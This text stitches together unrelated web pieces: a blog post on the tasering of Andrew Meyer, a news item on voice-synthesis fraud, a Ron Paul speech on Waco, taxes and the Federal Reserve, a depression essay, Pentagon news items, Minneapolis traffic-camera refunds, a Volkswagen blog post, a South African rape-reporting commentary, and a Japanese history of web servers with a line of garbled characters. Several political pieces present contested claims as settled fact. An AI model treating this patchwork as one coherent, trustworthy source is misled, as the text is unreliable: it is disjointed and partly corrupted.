It 's quite clear from the videos of the event with Meyer that he was NOT being disruptive -- unless you believe that speaking truth to power , or talking about uncomfortable subjects like black voter disenfranchisement when only " questions " are allowed , constitutes " disruption " .
Meyer spoke for about a minute and a half , his microphone was cut off , and he was arrested , pleading for help and asking for outrage from an American student audience that sat on its hands .
Tellingly , John Kerry did little or nothing to stop the atrocity .
In America , dissent must be done " properly " , with the right " tone " , and not step on the toes of big name politicians , or speak the truth about how democracy in this country is a sham .
My suggestion is this : when someone speaks piously about the tone of a political opponent , or the breaking of rules meant to curtail free speech ( like making " statements " instead of asking questions ) , this is almost always an excuse to deep - six the political content of the person 's speech , and to delegitimize his or her rights .
For the record , a poll over at the Washington Post has over one - third of the respondents endorsing the statement that this attack on free speech is evidence we have become a police state .
As the Bush administration lurches towards war with Iran , and continues its illegal and brutal occupation of Iraq , the police will be used to restrain and imprison opposition to the status quo .
The arrest and electrical shock attack by police upon Andrew Meyer -- no matter what one thinks about his " personality " or whether he was perpetuating a " stunt " or not -- is a small taste of the barbarity this government serves up to those who would oppose its untrammeled rule .
Please support Amnesty International in their campaign to have a rigorous , independent , impartial study of the taser 's use and its effects .
Up to now , most of the touted " independent " studies demonstrating the " safety " of this lethal device have been scandalously linked to the manufacturer .

Will it be more difficult to trust the bank manager of the future ?
In the future , it may be possible to mimic someone 's voice exactly after recording just one sentence .
Such technologies would pose a danger if it were not possible to verify who was speaking , researchers believe .
Scientists were predicting the future at the British Association ( BA ) Festival of Science in York .
Dr David Howard from the University of York said : " The reason things are changing is because no longer are we using an acoustic model proposed in the 1950s . "
It 's not scaremongering ; it 's trying to say to people , 'we have to think about these things '
David Howard
" We are beginning to simulate virtual vocal tracts in the computer , " said Dr Howard .
" When we simulate this in the computer , which we are beginning to do , we begin to get sounds that musicians describe as organic or more natural .
" If we get to the point where we are synthesising the actual shape of somebody ( 's vocal tract ) based on analysis of their speech , then the speech we are producing should sound and look like the actual person . "
' Not scaremongering '
Worrying scenarios envisaged by the researchers included a phone call , apparently from your bank manager , requesting you to confirm details of your account .
New technologies involve creating a synthesised human windpipe
Fraudsters are already making this kind of call ; but the new technology could make them much more convincing .
It might become easier to make prank calls as well .
The terrorism aspect would come in if the technology were used for more malicious purposes , such as someone taking over a communications network for a country and broadcasting a speech apparently from the country 's leader .
" This gives rise to this notion of what I call vocal terrorism as a possible scenario in the future , which I 'm suggesting one should be thinking about now and not thinking about when it happens .
" It 's not scaremongering ; it 's trying to say to people , ' we have to think about these things ' , " he said .
Dr Howard made these predictions to challenge the view of young people on social responsibility .
Congressman Ron Paul Speaks Out !
A s
peech by : The Honorable Congressman Ron Paul ( 2002 )
On the Waco Massacre [ 1 ] & The Federal income tax is UNCONSTITUTIONAL
“ When I say cut taxes , I do n't mean fiddle with the code .
I mean abolish the income tax and the IRS , and replace them with nothing . ” — Dr. Ron Paul [ 3 ]
" The other day , I made a huge " gaffe " on national TV : I told the truth about the crimes of the U.S. government .
As you can imagine , the ceiling fell in , and a couple of walls too .
Congressmen are supposed to support the government , I was told .
Oh , it 's okay to criticize around the edges , but there are certain subjects a member of the House of Representatives is not supposed to bring up .
But I touched the real " third - rail " of American politics , and the sparks sure flew .
I was interviewed on C - SPAN 's morning " Washington Journal , " and I used the opportunity , as I do all such media appearances , to point out how many of our liberties have been stolen by the federal government .
We must take them back .
The Constitution , after all , has a very limited role for Washington , D.C.
If we stuck to the Constitution as written , we would have : no federal meddling in our schools ; no Federal Reserve ; no U.S. membership in the UN ; no gun control ; and no foreign aid .
We would have no welfare for big corporations , or the " poor " ; no American troops in 100 foreign countries ; no NAFTA , GATT , or " fast - track " ; no arrogant federal judges usurping states rights ; no attacks on private property ; and no income tax .
We could get rid of most of the cabinet departments , most of the agencies , and most of the budget .
The government would be small , frugal , and limited .
That system is called liberty .
It 's what the Founding Fathers gave us .
Under liberty , we built the greatest , freest , most prosperous , most decent country on earth .
It 's no coincidence that the monstrous growth of the federal government has been accompanied by a sickening decline in living standards and moral standards .
The feds want us to be hamsters on a treadmill - - working hard , all day long , to pay high taxes , but otherwise entirely docile and controlled .
The huge , expensive , and out - of - control leviathan that we call the federal government wants to run every single aspect of our lives .
Well , I 'm sorry , but that 's not America .
It 's not what the Founders gave us .
It 's not the country you believe in .
It 's not the country I believe in .
So , on that TV interview , I emphasized not only the attacks on our property , but also the decline of our civil liberties , at the hands of the federal police .
There are not supposed to be any federal police , according to the Constitution .
Then I really went over the line .
I talked about the Waco massacre .
Bill Clinton and Janet Reno claim those 81 church members , including 19 children , burned down their own church and killed themselves , and good riddance .
So they put few survivors on trial , and threw them in prison for 40 years .
We 're not supposed to remember that the Bureau of Alcohol , Tobacco , and Firearms -- talk about an unconstitutional agency -- rather than arrest David Koresh on his regular morning jog , called in the TV stations for big publicity bonanza , and sent a swat team in black masks and black uniforms to break down his front door , guns blazing .
They also sent in a helicopter gunship , to shoot at the roof of a church full of innocents .
The Branch Davidians resisted , and after a heartless siege of almost two months , and after cutting off food , water , and electricity , and playing horrible rock and roll through huge speakers 24 hours a day , the feds sent in the tanks to crush the walls of the church , and inject poisonous CS gas .
Now , CS gas is banned under the Paris Convention on Chemical Warfare .
The U.S. could not use it in a war .
But it could and did use it against American civilians .
After the tanks did their work on the church , the place burst into flame , and all 81 people - - men , women , children , and babies - were incinerated in a screaming horror .
Did some feds set the fire ?
Did the flammable CS gas ignite , since without electricity , the parishioners were using lanterns ?
Did a tank knock over a lantern , striking one of the bales of hay being used against the thin walls as a " defense " against bullets ?
Or did the Davidians , as Clinton and Reno claim , kill themselves ?
A new documentary — Waco : The Rules of Engagement — may show , through FLIR infrared photography , FBI snipers killing the Davidians by shooting through the back of the church , where no media cameras were allowed .
This film won a prize at the famed Sundance Film Festival .
It was made by people who took the government 's side , until they investigated .
Whatever the truth , there 's no question that an irresponsible federal government has innocent blood on its hands , and not only from Waco .
And the refusal of corrupt and perverse liberals to admit it means nothing .
In my interview , in answer to a caller 's question , I pointed out that Waco , and the federal murders at Ruby Ridge - especially the FBI sniper 's shot that blasted apart the head of a young mother holding her baby - caused many Americans to live in fear of federal power .
Then I uttered the sentiment that caused the media hysteria : I said that a lot of Americans fear that they too might be attacked by federal swat teams for exercising their constitutional rights , or merely for wanting to be left alone .
Whoa !
You 've never seen anything like it .
For days , in an all - out assault , I was attacked by Democrats , unions , big business , establishment Republicans , and - of course - the media , in Washington and my home state of Texas .
Newspapers foamed at the mouth , calling me a " right - wing extremist . "
( Say , is n't that what George III called Thomas Jefferson ? )
I was even blamed for the Oklahoma City bombing !
And by the way , I do n't believe we 've gotten the full truth on that either .
All my many opponents were outraged that a Congressman would criticize big government .
" If you do n't like Washington , resign ! " said a typical big -city newspaper editorial .
But the media , as usual , were all wet .
( Do they ever get anything right ? )
The average Congressman may go to Washington to wallow in power , and line his pockets with a big lobbying job for a special interest ( so he can keep ripping - off the taxpayers ) .
But that 's not why I 'm in Congress .
It 's not why I left my medical practice as a physician .
It 's not why I put up with all the abuse .
It 's not why I refuse a plush Congressional pension .
I 'm in this fight for a reason .
I want to hand on to my children and grandchildren , and to you and your family , a great and free America , an America true to her Constitution , an America worthy of her history .
I will not let the crooks and clowns and criminals have their way .
I 'm in Congress to represent the ideas of liberty , the ideas that you and I share , for the people of my district , for the people of Texas , for the people of America .
That 's why I 'm working to stop federal abuses , and to cut the government : its taxes , its bureaucrats , its paramilitary police , its spending , its meddling overseas , and every single unconstitutional action it takes .
And not with a pair of nail scissors , but with a hammer and chisel .
Wo n't you help me do this work ?
Not much of the federal leviathan would be left , if I had my way .
But you'd be able to keep the money you earn , your privacy would be secure , your dollar would be sound , your local school would be tops , and your kids would n't be sent off to some useless or vicious foreign war to fight for the UN .
But Jefferson and the other Founders would recognize our government , and our descendants would bless us .
By the way , when I say cut taxes , I do n't mean fiddle with the code .
I mean abolish the income tax and the IRS , and replace them with nothing .
Recently , I asked a famous Republican committee chairman - who 's always talking about getting rid of IRS - why he engineered a secret $ 580 million raise for the tax collectors .
" They need it for their computers , " this guy told me .
So the IRS can't extract enough from us as it is !
The National Taxpayers Union says I have the highest pro-taxpayer rating in Congressional history , that I am the top " Taxpayer 's Best Friend . "
You know I wo n't play the Capitol Hill games with the Capitol Hill gang , denouncing the IRS while giving the Gestapo more of your money .
Or figuring out some other federal tax for them to squeeze out of you .
I also want to abolish the Federal Reserve , and send Alan Greenspan out to get a job .
The value of our dollar and the level of our interest rates are not supposed to be manipulated by a few members of the power elite meeting secretly in a marble palace .
The Federal Reserve is unconstitutional , pure and simple .
The only Constitutional money is gold and silver , not notes redeemable in them .
Not fed funny money .
Without the Federal Reserve , our money could not be inflated at the behest of big government or big banks .
Your income and savings would not lose their value .
Just as important , we would n't have this endless string of booms and busts , recessions and depressions , with each bust getting worse .
They are n't natural to the free market ; they 're caused by the schemers at the Fed .
President Andrew Jackson called the 19th - century Fed " The Monster " because it was a vehicle for inflation and all sorts of special - interest corruption .
Let me tell you , things have n't changed a bit .
I also work to save our schools from D.C. interference .
Thanks to the feds , new curriculums not only smear the Founders as " racist , slave - owning elitists , " they seek to dumb down our students so they will all be equal .
" Look - say " reading and the abolition of phonics has the same purpose , and so does the new " fuzzy " math , in which there are no right and no wrong answers .
That must be what they use in the U.S. Treasury !
It 's certainly what they use in the U.S. Congress .
But ever since the beginning of federal aid to education and accelerating with the establishment of the rotten Department of Education , SAT scores have been dropping .
Schools , with few exceptions , are getting worse every year .
To save our kids , we must get the sticky fingers of the feds off our local schools , and let parents rule .
That 's what the Constitution says , and the Bible too .
And then there 's my least favorite topic , the UN .
World government is obviously unconstitutional .
It undermines our country 's sovereignty in the worst way possible .
That 's why I want us out of the UN , and the UN itself taking a hike .
After all , the UN is socialist and corrupt ( many votes can be bought with a " blonde and a case of scotch , " one UN ambassador once said ) .
It costs many billions , and it puts our soldiers in UN uniforms under foreign commanders , and sends them off to unconstitutional , undeclared wars .
When Michael New , one of the finest young men I 've ever met , objected to wearing UN blue , he was kicked out of the American Army .
What an outrage !
Not one dime for the UN , and not one American soldier !
Not in Haiti , not in Bosnia , not in Somalia , not in Rwanda .
I know its radical , but how about devoting American military efforts to defending America , and only America ?
Such ideas , said one newspaper reporter , make me a maverick who will never go far because he wo n't go along to get along .
Darn right !
What does " go far " mean ?
Get a big government job ?
To heck with that .
And I wo n't sell my vote for pork either .
When I walked through the U.S. Capitol this morning , I got angry .
The building is filled with statues and painting of Jefferson , Madison , and the other Founders .
Those great men sacrificed everything to give us a free country , and a Constitution to keep it that way .
When I was first elected , I placed my hand on the Bible and swore an oath to uphold the Constitution .
That 's exactly what I 'm fighting for .
But such ideas drive the liberals crazy .
That 's why I badly need your help .
I 've been targeted nationally for defeat .
The Democrats , the AFL - CIO , the teachers union , big business PACs , the trial lawyers , the big bankers , the foreign - aid lobbyists , the big media , and the establishment Republicans want to dance on my political grave .
The Fed , the Education Department , and the UN are anxious to join in .
They can't stand even one person telling the truth .
And they 're terrified when that truth gains the people 's support .
Right now , four well - funded Democrats are competing to try to beat me , and a Republican is rumored to have been offered money at a secret meeting in Mexico ( ! ) if he would try to knock me off in a primary .……
Join this fight for the Constitution , and stop those who want to rip it up , and throw it in the Potomac .
Together , we can join the Founders ' fight .
Together , we can make history . "
Sincerely , Ron Paul

( You would be wise to read many of these articles )
“ What are you so depressed about ? ”
Anyone who ’s ever suffered from depression has probably heard this question at least once in their lives .
It ’s often spoken not by a mean - spirited stranger , but an honestly caring friend or family member who simply does n’t understand your continued blue mood .
Which makes it all the more harder a question to answer .
If someone who ’s suffering from depression knew the answer to the question , the question might be moot .
But the hardship with depression , like with any mental disorder , is that it ’s hard to explain to someone who ’s never been through it .
“ What are you so depressed about ? ”
The answer is n’t easy to pinpoint :
“ Well , nothing in particular .
Everything .
My life , where it ’s going , how I ca n’t seem to do anything .
How I have no energy , morning , noon or night .
How my medications do n’t always seem to help as much as I would like them to .
The terrible side effects .
Not wanting sex , even though my significant other does .
It ’s not one single thing .
It ’s nothing — I have everything , yet I ’m still unhappy .
If I knew , do n’t you think I ’d be less down about it ?
I do n’t know .
I do n’t know . ”
Depression does n’t come packaged in a nice , neat little box that you can just take out and put away at will .
In fact , one of the best things a person could learn about depression is that if “ will ” had anything to do with it , nobody would ever be depressed .
It ’s not about willpower .
It ’s not about not wanting to be depressed .
It ’s not about just thinking positive thoughts and feeling better .
It ’s about feeling out of control , and not really caring .
It ’s about feeling down for no reason , and still , not really caring .
It ’s about watching parts of your life crash down around you , and still , not caring .
“ What are you so depressed about ? ”
“ You would n’t understand .
There ’s no answer I could share that would explain it to your satisfaction . ”
Depression is n’t being upset about not getting a promotion , or missing a favorite TV show .
Depression is a longer - lasting feeling that does n’t go away even though you have “ nothing ” to be depressed about .
Depression ’s cause is n’t always known , or even knowable .
People who have depression do n’t ask for it , and they did n’t do something to deserve it .
A person with depression is an ordinary person , just you and I , who happens to be grappling with a kind of disorder similar to someone who deals with diabetes or even something more life - threatening , like cancer .
They did n’t ask for those things , it just happens .
So please , do n’t ask “ What are you so depressed about ? ”
It ’s not an easy question to answer for someone who has depression , and even if they have an answer , it ’s probably not the answer you want to hear .
What Are You So Depressed About ?
But Senator James Inhofe , an Oklahoma Republican on the committee , immediately disagreed , setting the stage for a series of partisan exchanges .
“ First of all , you can read the same report and come up with different conclusions , which is quite obvious and will be obvious , ” Mr. Inhofe said , adding that the report cannot easily be interpreted as “ a devastating condemnation , ” as Mr. Levin asserted .
The long - awaited report by Thomas F. Gimble , the Pentagon ’s acting inspector general , concluded that , while the Feith team did not violate any laws or knowingly mislead Congress , it developed dubious intelligence that was inconsistent with the findings of the wider intelligence community .
Mr. Gimble told the committee today that , while the Pentagon ’s in - house intelligence - gathering was not illegal or unauthorized , “ the actions , in our opinion , were inappropriate , given that all the products did not clearly show the variance with the consensus of the intel community , and in some cases were shown as intel products . ”
When Mr. Inhofe pressed Mr. Gimble on whether he agreed with Mr. Levin ’s characterization of his report , Mr. Gimble said he viewed the document as “ a flat , fact - based report of the events that occurred .
I do n’t have an opinion as to whether it ’s devastating or not devastating . ”
On Thursday , as details of Mr. Gimble ’s report were beginning to come out , Mr. Feith issued a statement saying his office ’s activities had been authorized by former Defense Secretary Donald H. Rumsfeld and former Deputy Secretary Paul D. Wolfowitz , and that his office properly shared its findings .
WASHINGTON ( CNN ) --
The Pentagon 's counterintelligence office is shutting down a database that contained information gathered within the United States , including intelligence about Iraq war protesters .
The Talon reporting system on threats to the Defense Department and domestic military installations will be closed September 17 , the Pentagon announced Tuesday .
Any data collected will be sent to the FBI until the Pentagon can establish a new program .
Any new database about domestic threats will be handled by the Pentagon 's homeland defense office and not by its counterintelligence arm , according to Defense Department officials .
The American Civil Liberties Union applauded the decision .
" It was high time for this program to be shut down , " said Anthony D. Romero , executive director of the ACLU .
" There should have been no place in a free democratic society for the military to be accumulating secret data on peaceful demonstrators exercising their First Amendment rights . "
The Defense Department cannot legally collect information in the U.S. about potential threats to its installations .
But in late 2005 , Talon made headlines when it was revealed that the Pentagon had kept initial reports in the database about peaceful protesters who posed no apparent threat .
After purging the database of those reports , the Pentagon found the database was not being used .
One official said it appeared that counterintelligence and military law enforcement were shying away from Talon because of negative publicity .
Officials are shutting it down because it is infrequently used , a source said .

A recent court ruling required the city of Minneapolis to refund money to 167 vehicle owners who challenged their traffic tickets .
The tickets were given out by the city ’s automatic ticketing machine called “ PhotoCop ” .
Earlier this year , the Minnesota Supreme Court deemed the ticket camera system illegal because it videotaped vehicles without proving who was behind the wheel .
The city has decided not to appeal the ruling and will refund the illegal ticket money to the 167 vehicle owners who challenged their tickets .
However , the city refuses to refund money to the 15,000 to 20,000 drivers who already paid their tickets .
The city ’s position is that if those people want their money back , they can sue for it .
And much to their chagrin , there has been a lawsuit filed in federal court that aims to put the illegally - collected money back in motorists ’ pockets .
It ’s clear that Minneapolis was in the wrong here and yet instead of admitting their mistake and refunding the money , they have chosen to use their legal resources against the people they financially harmed .
And the final slap in the face is that they ’re using taxpayers ’ funds to do it .

VeeDub is no longer in ze haus .
During our daily reading of various automotive blogs ( which for the sake of this article we 'll call jalopnik.com ) , we stumbled upon some very troubling news .
Apparently the EVP of Volkswagen North America - Adrian Hallmark - is quoted as having said the following about the upcoming Scirocco : " We do n't want it . "
Yes , VeeDub 's North American execs are going on the record saying that they do n't want to bring the company 's most - anticipated vehicle of the past decade over to the U.S. Instead , we 'll get soft - roading " SUVs " like the Tiguan .
Insert a sarcastic " Oh boy " , " yay " or " good move , guys " here ...
Here 's what we 'll be missing out on : Damn .
This story out of South Africa caught my attention .
Superintendent Conrad Engelbrecht , head of the family violence and child protection unit in Port Elizabeth , said police believed the demand for post - exposure ARV drugs was behind the surge in rape complaints .
He said they had caught wind of the problem after noticing a big percentage of rape cases were either scrapped as false or withdrawn .
“ It seems that some complainants are having unprotected sex and panic when they suspect their partner might be HIV - positive .
“ They then lay a charge of rape with the police because they know all rape victims get treated with ARVs . ”
This assumption that the increase in reporting and the increase in cases labeled false or withdrawn is due to women lying about being raped is a very dangerous assumption .
For many people it is an easy assumption to make since it fits neatly into their long standing biases which contribute to rape victims remaining silent and which allows so many rapists to view their actions as acceptable .
It 's harder to see when the source of the problem is a system that is too eager to label real rape victims as false accusers ( including taking actions which lead to false recanting of the allegations ) and which actively , if unintentionally , drives many rape victims away then blames the victims for leaving .
As a volunteer advocate I 've been in the hospital with rape victims who endured the process of getting a rape kit done and who wanted treatment to help them prevent STDs but who did n't know if they could endure how they would be treated if they reported to law enforcement .
This happened even though there was a strong victim services agency available to help them navigate the system and well - trained local law enforcement agencies .
Deciding to report was rarely easy unless the victim was one of those rare few who was attacked at gunpoint or knifepoint by a stranger .
Even with good support from victim services and law enforcement , the process of reporting and going to trial , if charges were ever made , was disruptive at best .
Many rape victims who had little hope that their rapist would be convicted because he would claim that the sex was consensual simply wanted to spare themselves months or years of agony .
They wanted to do what so many victim blamers demand .
They wanted to get over it .
This ugly reality for rape victims makes it easy to understand why so many rape victims were n't reporting before potentially life - saving drugs were available to them if they came forward .
They may believe that it is better to be alive and falsely labeled as a liar than to be dead .
Uglier still is that many people advocate for the removal of support and medical treatment for rape victims since according to them support and medical treatment give women too much incentive to lie about being raped .
Hey , if we made women pay a thousand dollars or more in cash ( which would be returned upon the conviction of their rapist ) so a bond could be posted which would cover the entire cost of the investigation that would really reduce the incentives women have to lie about rape .
To make it fair , stab and gunshot wounds would be equivalent to half the fee .
We can't have it equal the whole fee since women who lie about rape are the kind of people who would stab or shoot themselves in their quest to be seen as real victims .
To those who see this story as proof that we cannot rest until we have removed all of the institutionalized incentives women have to lie about being raped I have to ask :
Why do n't you take equal pains to remove all of the institutionalized incentives men have to lie about not being rapists ?
Oh , wait .
That would needlessly harm people who have done nothing wrong , a fate meant only for rape victims .

Webの黎明と商用インターネットの始まり
1989年にスイスのCERNに在籍していたティム・バーナード・リー（彼自身はイギリス人である）は、ネットワークを通じて互いに連携した文書に関するプロジェクトを提案した。このプロジェクトがWorld Wide Web――マークアップ言語のHTML、転送プロトコルのHTTP、名前指定のURI―（以下ではWWWと略す）の始まりである。そして1990年クリスマス、NeXTコンピュータ上にObjective-Cでプログラムされた最初のサーバーhttpdとクライアントWorldWideWebが完成した。この1990年という年はまた、ARPANETの終了の年であり、一方でワールドコムオンラインが一般ユーザーにダイアルアップサービスの提供を開始した年でもある。1989年のインターネット上での商業用電子メールの解禁と共に、まさにインターネット時代の始まりと言えよう。 リーが考えたWWWは以下の言葉に示されている。
「 it was designed to allow people to work together by combining their knowledge in a web of hypertext documents （人々がハイパーテキストドキュメント――相互リンクされた文書――のウェブの中に知識をまとめることで協働できるように設計された）」Longer Biography
この言葉をあらためて現在の目線で読み返すと、現在進行形で起きているWeb 2.0という潮流は、ティム・バーナード・リーのオリジナルなWeb 1.0へのルネッサンス的な要素があることに気付くだろう。
だが 、Web 2.0（すなわち現在）へ進む前に、このオリジナルのWWWがどのような変化を遂げて来たか、あらためて振り返ってみよう。
もう一度、冒 頭 の1990 年にティム・バーナード・リーが最初のWWWをプログラムした時のことを思い起こしてみよう。彼が利用していたのがNeXTだという点は実に象徴的だ。NeXTはアップル社を追われたスティーブ・ジョブズが産み出したウィンドウシステムを持ち真のマルチタスクで動くUnix系のワークステーションである。NeXT自身はそれほど強い影響力を市場へ与えることはできなかったが、その兄弟とも言えるコンピュータ群が企業へ一斉に導入された時期と重なるからだ。
1つ はUnixサーバー。ダウンサイジングという言葉と共にメインフレームやミニコン／オフコンをリプレースしていくことになる（この流れは1980年台中頃から始まっている）。
そしてももう1つ はWindowsパソコン 。Windows 3.0（1990ただし日本では1991）と続くWindows
3.1（1992ただし日本では1993）は、その利用のしやすさにより急速に企業内に導入されていった。
こ の2つの組み合わせは、従来のメインフレームとダム端末の替わりにクライアント／サーバシステムという名前でまたたく間に企業システムを変えていった。
なお、IBMが創業以来の初めて赤字計上（17億ドル）したのが1991年だということもこの時期を象徴する出来事である。
が、この時、より重要な変化が企業システムのインフラとしてもたらされたことに注目したい。メインフレームからクライアントサーバへの移行によるインフラ上の最も顕著な変化はネットワークにあった。従来メインフレームにぶら下がる形で配置されていたダム端末を、各自のデスクトップのクライアントPCによって置き換えるためにLANが導入されることになったからだ。なおこの時期に利用されていたプロトコルは必ずしもTCP／IPだけというわけではなく、特にPCだけで構築されているような場合にはNetBEUIやIPXなどの比重が高かったように思われる。
このようにして 、1993 年頃に はUnixサーバ 、Windows PC、LANといったインフラ とVisual Basicによるクライアントアプリケーション、サーバー上のOracle、サイベースといったRDBMS、TUXEDOなどのOLTPモニターを利用したサーバーアプリケーションといったクライアントサーバコンピューティング環境が実現した。ちなみに、IBM中興の祖のルイス・ガースナーが会長兼CEOに就任したのも1993年である。
1991年以降、ティム・バーナード・リーはWWWをオープンな状態で公知していった。これにより、プトロコルのHTTP、文書記述のHTML、文書位置指定のURIはインターネットで共有される重要な知的資産として広く利用されることになり、クライアント、サーバー共にオリジナルな実装が出現することになった。
この流れの中で 、1993 年NCSA Mosaicブラウザーが登場し、1994年にはNCSAからスピンオフしたマーク・アンドリーセンらによってネットスケープ社が設立されNetscapeブラウザーが公表された。
1993年にはサーバー側にも大きな変化があった。それは同じくNCSAがリリースしたNCSA
HTTPdだ。NCSA HTTPdは、単に存在するファイルをクライアントへ送るだけではなく動的なコンテンツを生成する機能を2種類実装していた。1つをCGI（Common Gateway Interface）と呼び、外部のプログラムを実行して出力結果をクライアントへ送るアプリケーションサーバー機能である。もう1つはSSI（Server Side Include）であり、HTML上に決められたフォーマットで記述したコメントをサーバーが出力時に外部のコマンドを実行したりして埋め込む機能である。
NCSA HTTPdをもっ て Webアプリケーションの嚆矢とするのが妥当であろう。
CGI とSSI はどちらも現在も利用されている機能である。特にLAMP（Linux +
Apache + MySQL + PHP ／Perl）またはLAPP
（Linux ＋ Apache ＋ PostgreSQL ＋ PHP／Perl）と呼称されるオープンソースソフトウェアを利用するシステム構築ではこれらの機能を抜きに語ることはできない。
また 、Javaのよう にWebサーバーとアプリケーションが一体化しているシステムにおいてもCGI的な機能（Java Servlet）とSSI的な機能（JavaServer Page）の両方がサポートされていることは、NCSA HTTPdのアプリケーションインターフェイス設計の良さを物語っていると言えよう。
1994年8月11日にニューハンプシャー州ナシュアに設立されたNetMarketというオンライン小売店が世界最初のEコマースサイトと言われている。この説が本当かどうかは議論が分かれる点があるようだが、Eコマースが1994年の夏頃から始まったということでは意見が一致しているようである。
しかし、実際にEコマースが本格化するには乗り越えなければならない壁があった。それはセキュリティである。インターネットは支払情報を交換するのにはあまりにもオープンだったからである。Eコマースのブレークスルーは、1995年にネットスケープがブラウザーにSSL（Secure Sockets Layer）を搭載したことによって起こった。マイクロソフトもIEでこれに追随したため、インターネット上の商取引にSSLを利用することがデファクトスタンダードとなった。
なお 、1995年はAmazon.comの創業の年でもある。
1995 年
1995年は企業システムとインターネットの両者にとって大きなインパクトがもたらされた年である。
具体的には 、Windows95 、Apache、Java、JavaScript、PHPの登場である。
Windows95は言うまでもなくマイクロソフト社のコンシューマ用OSとしては初めて32ビット空間と横取り制御による完全なマルチタスクを実装したOSである。Windows95のインパクトは、あらかじめTCP／IPプロトコルスタックが搭載されていたことと、32ビット仮想デバイスドライバの採用によりWindows3.xでは避けようがなかったドライバによるメモリコンフリクト障害が減少したことでインターネットの利用が飛躍的に簡単になったことである。
サーバーに目を向ける とWebサーバー のApache 0.2の登場が同じく1995年（こちらは3月と早い）である。NCSA HTTPdにパッチを当てた（A patch）という洒落から命名されたと言われる(追記：http://www.apache.org/foundation/faq.html#name
ではネイティブアメリカンのアパッチ族に対する敬意から採用されたとしている)Apacheは、ブラウザーでネットスケープが果たしたようなNCSA離れをWebサーバーで巻き起こした。ただし、ネットスケープと異なるのはApacheがNCSA
HTTPdの運用に困った全米のネットワーク管理者たちの連合のような形式で運用が開始されたことである。このため、Apacheはオープンソースソフトウェアの管理母体として運用されて行くことになった。
Apacheのインパクトはある意味においてはWindows95より大きいかも知れない。なぜならばApacheは単にインターネットに対する影響だけではなくその後のオープンソースソフトウェアの展開にも大きく寄与しているからである。クライアントに関しては企業システム、インターネットともにマイクロソフト社のOSを搭載したPCが主流となったのに対し、サーバーについてはBSDやLinuxなどのオープンソースシステムが一定の割合を占めている理由の1つに、最も利用されているWebサーバーのApacheがオープンソースソフトウェアであり実行のためのライセンスフィーがかからないことや、移植性の高さのためにサーバーOSを問わないということが挙げられるだろう。ちなみにThe Internet Operating System Counter の1999年4月の調査では、インターネット上のホストの44％がLinuxとBSDの2つのオープンなシステムで、続くWindows95/98/NTが全体の24.5%を占めている。これに対して同年3月のWebサーバーアプリケ
!<%7%g%s$ N%7 % ' % " $ O [ [ Netcraftによれば |http://news.netcraft.com/archives/web_server_survey.html]]Apacheが約60%、Microsoftが約25%である。MicrosoftのシェアがOSとWebサーバーでほぼ等しいのに対し、Apacheのシェアの大きさはいかにUnix系のOSでApacheが利用されているかを物語っていると言えよう。
一方、サンマイクロシステムズがそれまでセットトップボックス用に開発していたプログラミング言語とその実行環境を、Javaと命名して公表したのも1995年である。Javaの特徴はOS非依存の実行コード形式と、ネットワーク上から取得しても安全に実行するためのセキュリティ機構にある。特にOS非依存という点がその後のサーバー上での展開に有利に働くことになったと考えられるが、この時点ではPCの能力不足やネットワークの速度不足により十全な働きをすることができなかった。このためJavaが特に重視されるようになったのは、プロプライエタリ路線からオープンシステムへの移行中のIBMが、Javaを全面的に取り入れるようになった1997年以降と考えられる。以降、J2EEと呼ばれるサーバーアプリケーション用の共通仕様が制定されたこともあり、企業システムにおけるWebアプリケーション開発の主流言語の位置を占めるに至ることになる。
JavaScriptはネットスケープ社がブラウザー上のコンテンツを動的に制御するために開発したプログラミング言語である。元々はLiveScriptという名称だったがJavaの人気に便乗してJavaScriptと途中で名称変更したものである。JavaScriptは名前を借りたJavaと同様に当初の想定とは異なる分野で重要な役割を持つことになった。それはネットスケープ社が開発したWebサーバーのアプリケーション記述言語としての利用である。実際にはネットスケープ社のWebサーバーのシェアは1995年から1996年にかけて約20％まで占めたもののその後急速に減少したためそのものとしてのインパクトは無かったと言えるかも知れないが、
クライアントコンピュータ用の簡易言語によって
Webサーバー内で直 接Webアプリケーションを実行可能
という2つ特徴を持つアプリケーションモデル（サーバーサイドスクリプティング）は、1997年にWindows NT Option Packで提供されたマイクロソフトのIIS
3.0 とASP に影響を与えたと考えるほうが自然であろう。いずれにせよホームページにちょっとしたアクセントを付けるためにエンドユーザーでもプログラミング可能な程度の簡易さと、CGIのように外部プログラムを実行しなくてもWebサーバーが直接実行できる実行効率の高さという、サーバーサイドスクリプティングが持つ2つの特徴は企業システムをWebアプリケーションとして実装するための大きなモチベーションとなったと言えよう。
そしてPHPの登場である。PHPはSSIのようにHTMLへプログラムを埋め込む形式のプログラミング言語である。それまでWebアプリケーションの開発にはテキスト処理に向いていて高速で何でもできるという点からPerlを利用したCGIが主流だったのに対し、HTMLの中にプログラムを埋め込むというWebアプリケーションの開発に特化したプログラミング言語の出現は、静的なコンテンツの中に動的な処理もある――たとえば多数の静的な文書の中に数箇所SSIによるカウンターが埋め込まれ、1つのCGIによる掲示板があるというようなインターネットのあり方に対して、サイトのほとんどを動的なWebアプリケーションによって構築するという時代への転換の原動力なったと言っても過言ではないだろう。なお、1995年にリリースされたPHPはPHP／FI（Personal Home Page Tools ／Form Interpreter）と呼ばれるパーソナルユースに限定されたバージョンであった。実際にPHPが飛躍的に利用されるようになったのは1997年にリリースされたPHP3（PHP
' Hypertext Preprocessor）からである 。PHP3はPHP／FIとの上位互換性を保ちながら、データベースへのアクセス機構の組み込みやモジュールによる拡張性の確保、そしてライセンスの見直しなどを行い、完全に作り直されたバージョンである。なお、現在PHPは、オープンソースソフトウェアとしての状態を維持しながらPHP3の開発者が創業したゼンド社によってサポートされている。
Webアプリケーション環境の充実
NCSA HTTPdに実装されたCGIとSSIは、いずれもWebサーバーとアプリケーションのインターフェイスである。Apacheの占めるシェアの高さからわかるように、インターネットの多くのホストで稼動するWebアプリケーションはこれらの機構を利用している。
しか しCGIにはWebサーバー とWebアプリケーションを異なるプロセスとして実行しなければならないという制約がある。プロセスの生成と消滅はどちらもシステムにとって負荷がかかる処理のため、個々のWebアプリケーション実行にはオーバーヘッドとなり、またスケーラビリティを低く抑えるインパクトでもある。それだけではなく、クライアントからの1回のリクエストの都度プロセスが新たに生成されるということは、セッション管理のための考慮が特別に必要になるということでもある。
したがって 、CGIが広く普及した1996年以降のWebアプリケーション環境で特に重視された機能は、
プロセスを新たに生成せず にWebアプリケーションを実行できるようにすることによる実行効率の向上
セッション管理の複雑さを個々のアプリケーションが意識せずに済むようにするための機構の提供
の2点に対するものである。
Apache
